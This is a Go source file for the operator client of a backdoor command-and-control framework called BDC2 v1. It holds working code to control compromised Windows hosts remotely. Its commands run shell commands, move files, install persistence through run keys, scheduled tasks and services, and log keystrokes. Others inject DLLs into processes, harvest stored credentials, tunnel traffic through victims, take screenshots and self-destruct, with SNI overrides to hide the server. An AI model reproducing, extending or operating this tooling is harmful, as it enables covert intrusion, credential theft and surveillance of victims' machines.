// Operator CLI for the consolidated BDC2 v1 C2.
//
// The wire protocol is frozen at BDC2 v1 (see internal/bdc2/proto.go). All
// merged capabilities are expressed as operator commands and task kinds,
// never as new frame types:
//   - session / task / file transfer        (baseline)
//   - bounded task queue + timeout retry    (server)
//   - chunked push with resume offset        (server + client)
//   - persistence / keylog / tunnel / inject / creds / cleanup / screenshot
//   - audit hash-chain verification          (local, no server round trip)
//   - operator-triggered hot reload          (OP_LIST with reload=1)
package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"time"
	"unicode/utf16"
	"unicode/utf8"

	"golang.org/x/text/encoding/simplifiedchinese"

	"backd/c2/mvp/internal/bdc2"
)

var (
	addr      = flag.String("addr", envOr("C2_OPERATOR_ADDR", "127.0.0.1:9910"), "operator endpoint: host:port, ws://host:port/path or wss://host/path")
	pathF     = flag.String("path", envOr("C2_OPERATOR_PATH", "/ws"), "websocket path when -addr carries none")
	sni       = flag.String("sni", envOr("C2_OPERATOR_SNI", ""), "TLS server name / Host override (e.g. oprand.example.com while dialing an IP)")
	dialIP    = flag.String("dial-ip", envOr("C2_OPERATOR_DIAL_IP", ""), "TCP dial target override (host:port); URL host stays for SNI/Host")
	family    = flag.String("family", envOr("C2_OPERATOR_FAMILY", "auto"), "address family: auto|4|6 (IPv6 is often the working path to Cloudflare)")
	tlsCA     = flag.String("tls-ca", envOr("C2_OPERATOR_TLS_CA", ""), "PEM bundle used as the TLS root CA")
	tlsPin    = flag.String("tls-pin", envOr("C2_OPERATOR_TLS_PIN", ""), "SHA-256 of the leaf certificate (hex/base64) to pin")
	insecure  = flag.Bool("insecure", envOr("C2_OPERATOR_INSECURE", "") == "1", "skip TLS certificate verification (test only)")
	tunnelOut = flag.String("tunnel-out", envOr("C2_OPERATOR_TUNNEL_OUT", ""), "directory for async NOTICE(sub=tunnel) payloads (default: print base64)")
	user      = flag.String("user", envOr("C2_OPERATOR_USER", "ops"), "operator name")
	psk       = flag.String("psk", envOr("C2_OPERATOR_PSK", ""), "operator pre-shared key (base64:/hex:)")
	tmo       = flag.Duration("timeout", 30*time.Second, "rpc timeout")
	quiet     = flag.Bool("q", false, "quiet")
)

func envOr(k, d string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return d
}

type opConn struct {
	c       *bdc2.WSConn
	key     []byte
	recvSeq uint32
	sendSeq uint32
}

func connect() (*opConn, error) {
	if *psk == "" {
		return nil, fmt.Errorf("missing -psk / C2_OPERATOR_PSK")
	}
	key, err := bdc2.DecodePSK(*psk)
	if err != nil {
		return nil, err
	}
	c, ep, err := bdc2.DialEndpoint(*addr, bdc2.DialOptions{
		Timeout:   10 * time.Second,
		MaxFrame:  1 << 20,
		Path:      *pathF,
		SNI:       *sni,
		DialAddr:  *dialIP,
		Family:    *family,
		Insecure:  *insecure,
		TLSCAFile: *tlsCA,
		TLSPin:    *tlsPin,
	})
	if err != nil {
		return nil, err
	}
	if !*quiet {
		tv := c.TLSVersion()
		if tv == "" {
			tv = "plain"
		}
		fmt.Fprintf(os.Stderr, "CONNECT %s tls=%s\n", ep.String(), tv)
	}
	nonce := make([]byte, 16)
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}
	mac := bdc2.OperatorAuthMAC(key, *user, nonce)
	payload := bdc2.EncodeTLV([]bdc2.KV{
		bdc2.S("user", *user),
		bdc2.B("nonce", nonce),
		bdc2.B("mac", mac),
	})
	frame, err := bdc2.SealFrame(nil, bdc2.TypeAuth, bdc2.FlagCleartext, 0, 0, bdc2.DirOperToServer, payload)
	if err != nil {
		return nil, err
	}
	if err := c.WriteBinary(frame); err != nil {
		c.Close()
		return nil, err
	}
	opk, err := bdc2.OperatorKey(key, *user)
	if err != nil {
		c.Close()
		return nil, err
	}
	op := &opConn{c: c, key: opk}
	typ, _, err := op.recvRaw()
	if err != nil {
		c.Close()
		return nil, err
	}
	if typ != bdc2.TypeAuthOK {
		c.Close()
		return nil, fmt.Errorf("auth rejected (type=%d)", typ)
	}
	return op, nil
}

func (o *opConn) recvRaw() (uint8, map[string][]byte, error) {
	for {
		o.c.SetReadDeadline(time.Now().Add(*tmo))
		_, data, err := o.c.ReadMessage()
		if err != nil {
			return 0, nil, err
		}
		typ, _, _, sq, payload, err := bdc2.OpenFrame(o.key, data, bdc2.DirServerToOper)
		if err != nil {
			return 0, nil, err
		}
		if sq <= o.recvSeq {
			return 0, nil, fmt.Errorf("replay: got seq %d", sq)
		}
		o.recvSeq = sq
		kv, err := bdc2.DecodeTLV(payload)
		if err != nil {
			return 0, nil, err
		}
		if typ == bdc2.TypeNotice {
			o.handleNotice(kv)
			continue
		}
		return typ, kv, nil
	}
}

// handleNotice demultiplexes NOTICE(type 12). A NOTICE carries either an
// operator-facing status message (reason/msg) or, for the merged client,
// asynchronous tunnel events (sub=tunnel, see bdc2.ParseTunnelNotice). Tunnel
// bytes are emitted as TUNNEL lines / files and never mixed into task output.
func (o *opConn) handleNotice(kv map[string][]byte) {
	if tn, ok := bdc2.ParseTunnelNotice(kv); ok {
		switch {
		case tn.IsData():
			fmt.Printf("TUNNEL ftype=data tid=%d len=%d data_b64=%s\n",
				tn.TID, len(tn.Data), base64.StdEncoding.EncodeToString(tn.Data))
			o.writeTunnelFile(tn)
		case tn.IsClose():
			fmt.Printf("TUNNEL ftype=close tid=%d\n", tn.TID)
		default:
			fmt.Printf("TUNNEL ftype=%d tid=%d len=%d data_b64=%s\n",
				tn.FType, tn.TID, len(tn.Data), base64.StdEncoding.EncodeToString(tn.Data))
		}
		return
	}
	reason := string(kv["reason"])
	msg := string(kv["msg"])
	sub := string(kv["sub"])
	switch {
	case reason != "":
		fmt.Fprintf(os.Stderr, "NOTICE reason=%s\n", reason)
	case msg != "":
		fmt.Fprintf(os.Stderr, "NOTICE msg=%s\n", msg)
	case sub != "":
		fmt.Fprintf(os.Stderr, "NOTICE sub=%s\n", sub)
	default:
		fmt.Fprintln(os.Stderr, "NOTICE (unparsed)")
	}
}

// writeTunnelFile optionally persists async tunnel payloads (default off; the
// TUNNEL line with base64 is the machine-readable output).
func (o *opConn) writeTunnelFile(tn bdc2.TunnelNotice) {
	if *tunnelOut == "" || len(tn.Data) == 0 {
		return
	}
	if err := os.MkdirAll(*tunnelOut, 0o755); err != nil {
		fmt.Fprintf(os.Stderr, "tunnel-out: %v\n", err)
		return
	}
	path := filepath.Join(*tunnelOut, fmt.Sprintf("tunnel-%d.bin", tn.TID))
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
	if err != nil {
		fmt.Fprintf(os.Stderr, "tunnel-out: %v\n", err)
		return
	}
	defer f.Close()
	if _, err := f.Write(tn.Data); err != nil {
		fmt.Fprintf(os.Stderr, "tunnel-out: %v\n", err)
	}
}

func (o *opConn) send(typ uint8, kvs []bdc2.KV) error {
	o.sendSeq++
	frame, err := bdc2.SealFrame(o.key, typ, 0, 0, o.sendSeq, bdc2.DirOperToServer, bdc2.EncodeTLV(kvs))
	if err != nil {
		return err
	}
	return o.c.WriteBinary(frame)
}

// listRPC returns sessions and runtime stats in one OP_LIST round trip.
func (o *opConn) listRPC(extra ...bdc2.KV) ([]map[string]any, map[string]any, error) {
	if err := o.send(bdc2.TypeOpList, extra); err != nil {
		return nil, nil, err
	}
	typ, kv, err := o.recvRaw()
	if err != nil {
		return nil, nil, err
	}
	if typ != bdc2.TypeOpListResult {
		return nil, nil, fmt.Errorf("unexpected type %d", typ)
	}
	if e := string(kv["reload_err"]); e != "" {
		return nil, nil, fmt.Errorf("reload: %s", e)
	}
	var arr []map[string]any
	_ = json.Unmarshal(kv["sessions"], &arr)
	var st map[string]any
	_ = json.Unmarshal(kv["stats"], &st)
	if st == nil {
		st = map[string]any{}
	}
	if string(kv["reloaded"]) != "" {
		st["reloaded"] = true
	}
	return arr, st, nil
}

// decodeConsole converts the byte stream produced by a Windows shell into
// UTF-8. Server 2008/cmd.exe emits the OEM code page (usually CP936/GBK) for
// Chinese output, while operators run in a UTF-8 terminal. A real BDC2 key or
// nonce mismatch would fail AES-GCM authentication before reaching this code.
func decodeConsole(b []byte) (string, bool) {
	if len(b) == 0 {
		return "", true
	}
	if bytes.HasPrefix(b, []byte{0xEF, 0xBB, 0xBF}) {
		b = b[3:]
	}
	if len(b) >= 2 && b[0] == 0xFF && b[1] == 0xFE {
		u := make([]uint16, 0, (len(b)-2)/2)
		for i := 2; i+1 < len(b); i += 2 {
			u = append(u, binary.LittleEndian.Uint16(b[i:i+2]))
		}
		return string(utf16.Decode(u)), true
	}
	if len(b) >= 2 && b[0] == 0xFE && b[1] == 0xFF {
		u := make([]uint16, 0, (len(b)-2)/2)
		for i := 2; i+1 < len(b); i += 2 {
			u = append(u, binary.BigEndian.Uint16(b[i:i+2]))
		}
		return string(utf16.Decode(u)), true
	}
	if utf8.Valid(b) && !bytes.ContainsRune(b, '\x00') {
		return string(b), true
	}
	if dec, err := simplifiedchinese.GBK.NewDecoder().Bytes(b); err == nil && utf8.Valid(dec) && !bytes.ContainsRune(dec, '\x00') {
		return string(dec), true
	}
	return "", false
}

func runTask(o *opConn, sid, kind, args string, extra ...bdc2.KV) {
	kvs := []bdc2.KV{
		bdc2.S("session", sid), bdc2.S("kind", kind), bdc2.S("args", args),
		bdc2.S("timeout", strconv.Itoa(int((*tmo).Seconds()))),
	}
	kvs = append(kvs, extra...)
	if err := o.send(bdc2.TypeOpTask, kvs); err != nil {
		fatalf("send: %v", err)
	}
	typ, kv, err := o.recvRaw()
	if err != nil {
		fatalf("recv: %v", err)
	}
	if typ != bdc2.TypeOpResult {
		fatalf("unexpected type %d", typ)
	}
	if !*quiet {
		fmt.Printf("STATUS %s\n", kv["status"])
	}
	if len(kv["err"]) > 0 {
		fmt.Printf("ERR %s\n", kv["err"])
	}
	if len(kv["out"]) > 0 {
		fmt.Printf("OUT_B64 %s\n", base64.StdEncoding.EncodeToString(kv["out"]))
		if s, ok := decodeConsole(kv["out"]); ok {
			fmt.Printf("OUT %s\n", s)
		} else {
			fmt.Printf("OUT_HEX %s\n", hex.EncodeToString(kv["out"]))
		}
	}
	if string(kv["status"]) != "ok" {
		os.Exit(1)
	}
}

func main() {
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, `usage: operator [flags] <command> [args]

Transport flags (or the matching C2_OPERATOR_* env vars):
  -addr    host:port | ws://host:port/path | wss://host/path   (C2_OPERATOR_ADDR)
  -sni     TLS server name / Host override                     (C2_OPERATOR_SNI)
  -dial-ip TCP target override, URL host still used for SNI     (C2_OPERATOR_DIAL_IP)
  -family  auto|4|6                                            (C2_OPERATOR_FAMILY)
  -tls-ca  PEM root CA bundle                                  (C2_OPERATOR_TLS_CA)
  -tls-pin SHA-256 of leaf cert, hex/base64                    (C2_OPERATOR_TLS_PIN)
  -insecure  skip certificate verification (test only)         (C2_OPERATOR_INSECURE=1)
  -tunnel-out dir for async tunnel payloads                    (C2_OPERATOR_TUNNEL_OUT)
  -user/-psk  operator identity / PSK                          (C2_OPERATOR_USER/PSK)

commands:
  list                                   list sessions
  stats                                  list sessions + server runtime stats
  reload [config-path]                   hot-reload server config (limits/flags/PSKs)
  task <sid> <kind> [args]               run any task kind
  shell <sid> <command>                  run a shell command
  push <sid> <local> <remote> [offset]   push file (offset = resume position)
  pull <sid> <remote> <out>              pull file to server staging
  fetch <xfer> <out>                     download a staged transfer
  kill <sid>                             drop a session
  persist <sid> [methods]                install persistence (runkey,startup,schtask,service)
  persist_status <sid>                   report persistence state
  persist_disable <sid> [methods]        remove persistence
  keylog_start|keylog_stop|keylog_dump <sid>
  tunnel_open <sid> <host:port>          open a client-side TCP tunnel
  tunnel_send <sid> <id> <data>
  tunnel_recv <sid> <id> [max]
  tunnel_close <sid> <id>
  inject <sid> <pid> <dll-path>          CreateRemoteThread(LoadLibrary)
  creds <sid>                            collect autologon / PuTTY / env secrets
  screenshot <sid>                       capture the client desktop to a BMP
  cleanup <sid> <path[;path]>            delete files/directories
  selfdestruct <sid> --yes               remove persistence and self-delete
  audit <audit.jsonl>                    verify the local audit hash chain

NOTICE(type 12) frames are demultiplexed: sub=tunnel events are printed as
TUNNEL lines (id/ftype/data) and never mixed into task OUT; other notices are
logged to stderr. BDC2 v1 frame layout is unchanged.
`)
	}
	flag.Parse()
	if flag.NArg() < 1 {
		flag.Usage()
		os.Exit(2)
	}

	cmd := flag.Arg(0)
	if cmd == "audit" {
		if flag.NArg() < 2 {
			fatalf("audit needs <audit.jsonl>")
		}
		n, bad, err := bdc2.VerifyAuditChain(flag.Arg(1))
		if err != nil {
			fmt.Printf("AUDIT FAIL verified=%d broken_line=%d err=%s\n", n, bad, err)
			os.Exit(1)
		}
		fmt.Printf("AUDIT OK verified=%d\n", n)
		return
	}

	o, err := connect()
	if err != nil {
		fatalf("connect: %v", err)
	}
	defer o.c.Close()

	switch cmd {
	case "list", "stats":
		sessions, st, err := o.listRPC()
		if err != nil {
			fatalf("list: %v", err)
		}
		b, _ := json.MarshalIndent(sessions, "", "  ")
		fmt.Println(string(b))
		if cmd == "stats" {
			sb, _ := json.MarshalIndent(st, "", "  ")
			fmt.Printf("STATS %s\n", string(sb))
		}
	case "reload":
		extra := []bdc2.KV{bdc2.S("reload", "1")}
		if flag.NArg() > 1 {
			extra = append(extra, bdc2.S("config", flag.Arg(1)))
		}
		sessions, st, err := o.listRPC(extra...)
		if err != nil {
			fatalf("reload: %v", err)
		}
		sb, _ := json.Marshal(st)
		fmt.Printf("STATUS ok\nSESSIONS %d\nSTATS %s\n", len(sessions), string(sb))
	case "task", "adv", "shell", "env", "ps", "ls", "cat", "screenshot",
		"persist_status", "keylog_start", "keylog_stop", "keylog_dump", "creds":
		if flag.NArg() < 2 {
			fatalf("%s needs <sid> [args]", cmd)
		}
		sid := flag.Arg(1)
		kind := cmd
		if cmd == "adv" {
			if flag.NArg() < 3 {
				fatalf("adv needs <sid> <kind> [args]")
			}
			kind = flag.Arg(2)
			args := ""
			if flag.NArg() > 3 {
				args = flag.Arg(3)
			}
			runTask(o, sid, kind, args)
			return
		}
		args := ""
		if flag.NArg() > 2 {
			args = flag.Arg(2)
		}
		runTask(o, sid, kind, args)
	case "persist":
		if flag.NArg() < 2 {
			fatalf("persist needs <sid> [methods]")
		}
		m := "runkey,startup"
		if flag.NArg() > 2 {
			m = flag.Arg(2)
		}
		runTask(o, flag.Arg(1), bdc2.KindPersistInstall, m)
	case "persist_disable":
		if flag.NArg() < 2 {
			fatalf("persist_disable needs <sid> [methods]")
		}
		m := "runkey,startup,schtask,service"
		if flag.NArg() > 2 {
			m = flag.Arg(2)
		}
		runTask(o, flag.Arg(1), bdc2.KindPersistDisable, m)
	case "tunnel_open":
		if flag.NArg() < 3 {
			fatalf("tunnel_open needs <sid> <host:port>")
		}
		runTask(o, flag.Arg(1), bdc2.KindTunnelOpen, flag.Arg(2))
	case "tunnel_send":
		if flag.NArg() < 4 {
			fatalf("tunnel_send needs <sid> <id> <data>")
		}
		runTask(o, flag.Arg(1), bdc2.KindTunnelSend, flag.Arg(2)+" "+flag.Arg(3))
	case "tunnel_recv":
		if flag.NArg() < 3 {
			fatalf("tunnel_recv needs <sid> <id> [max]")
		}
		args := flag.Arg(2)
		if flag.NArg() > 3 {
			args += " " + flag.Arg(3)
		}
		runTask(o, flag.Arg(1), bdc2.KindTunnelRecv, args)
	case "tunnel_close":
		if flag.NArg() < 3 {
			fatalf("tunnel_close needs <sid> <id>")
		}
		runTask(o, flag.Arg(1), bdc2.KindTunnelClose, flag.Arg(2))
	case "inject":
		if flag.NArg() < 4 {
			fatalf("inject needs <sid> <pid> <dll-path>")
		}
		runTask(o, flag.Arg(1), bdc2.KindInject, flag.Arg(2)+" "+flag.Arg(3))
	case "cleanup":
		if flag.NArg() < 3 {
			fatalf("cleanup needs <sid> <path[;path]>")
		}
		runTask(o, flag.Arg(1), bdc2.KindCleanup, flag.Arg(2))
	case "selfdestruct":
		if flag.NArg() < 3 || flag.Arg(2) != "--yes" {
			fatalf("selfdestruct needs <sid> --yes")
		}
		runTask(o, flag.Arg(1), bdc2.KindSelfDestruct, "", bdc2.S("confirm", "yes"))
	case "push":
		if flag.NArg() < 4 {
			fatalf("push needs <sid> <local> <remote> [offset]")
		}
		data, err := os.ReadFile(flag.Arg(2))
		if err != nil {
			fatalf("read: %v", err)
		}
		kvs := []bdc2.KV{
			bdc2.S("session", flag.Arg(1)), bdc2.S("file", flag.Arg(3)), bdc2.B("data", data),
		}
		if flag.NArg() > 4 {
			if off, err := strconv.ParseInt(flag.Arg(4), 10, 64); err == nil && off > 0 {
				kvs = append(kvs, bdc2.S("off", strconv.FormatInt(off, 10)))
			}
		}
		if err := o.send(bdc2.TypeOpFilePush, kvs); err != nil {
			fatalf("send: %v", err)
		}
		typ, kv, err := o.recvRaw()
		if err != nil {
			fatalf("recv: %v", err)
		}
		if typ != bdc2.TypeOpResult {
			fatalf("unexpected type %d", typ)
		}
		fmt.Printf("STATUS %s\nSHA %s\nERR %s\n", kv["status"], kv["sha"], kv["err"])
		if string(kv["status"]) != "ok" {
			os.Exit(1)
		}
	case "pull":
		if flag.NArg() < 4 {
			fatalf("pull needs <sid> <remote> <out>")
		}
		if err := o.send(bdc2.TypeOpFilePull, []bdc2.KV{
			bdc2.S("session", flag.Arg(1)), bdc2.S("file", flag.Arg(2)),
		}); err != nil {
			fatalf("send: %v", err)
		}
		typ, kv, err := o.recvRaw()
		if err != nil {
			fatalf("recv: %v", err)
		}
		if typ != bdc2.TypeOpResult {
			fatalf("unexpected type %d", typ)
		}
		fmt.Printf("STATUS %s\nXFER %s\nSIZE %s\nSHA %s\nERR %s\n",
			kv["status"], kv["xfer"], kv["size"], kv["sha"], kv["err"])
		if string(kv["status"]) != "ok" {
			os.Exit(1)
		}
	case "fetch":
		if flag.NArg() < 3 {
			fatalf("fetch needs <xfer> <out>")
		}
		if err := o.send(bdc2.TypeOpFileFetch, []bdc2.KV{bdc2.S("xfer", flag.Arg(1))}); err != nil {
			fatalf("send: %v", err)
		}
		f, err := os.Create(flag.Arg(2))
		if err != nil {
			fatalf("create: %v", err)
		}
		var total int64
		for {
			typ, kv, err := o.recvRaw()
			if err != nil {
				f.Close()
				fatalf("recv: %v", err)
			}
			if typ == bdc2.TypeError {
				f.Close()
				fatalf("server error: %s", kv["msg"])
			}
			if typ == bdc2.TypeOpFileChunk {
				n, err := f.Write(kv["data"])
				if err != nil {
					f.Close()
					fatalf("write: %v", err)
				}
				total += int64(n)
				continue
			}
			if typ == bdc2.TypeOpFileDone {
				f.Sync()
				f.Close()
				fmt.Printf("STATUS ok\nSIZE %d\nSHA %s\n", total, kv["sha"])
				return
			}
		}
	case "kill":
		if flag.NArg() < 2 {
			fatalf("kill needs <sid>")
		}
		if err := o.send(bdc2.TypeOpKill, []bdc2.KV{bdc2.S("session", flag.Arg(1))}); err != nil {
			fatalf("send: %v", err)
		}
		typ, kv, err := o.recvRaw()
		if err != nil {
			fatalf("recv: %v", err)
		}
		if typ != bdc2.TypeOpResult {
			fatalf("unexpected type %d", typ)
		}
		fmt.Printf("STATUS %s\n", kv["status"])
	default:
		flag.Usage()
		os.Exit(2)
	}
}

func fatalf(f string, a ...any) {
	fmt.Fprintf(os.Stderr, f+"\n", a...)
	os.Exit(1)
}
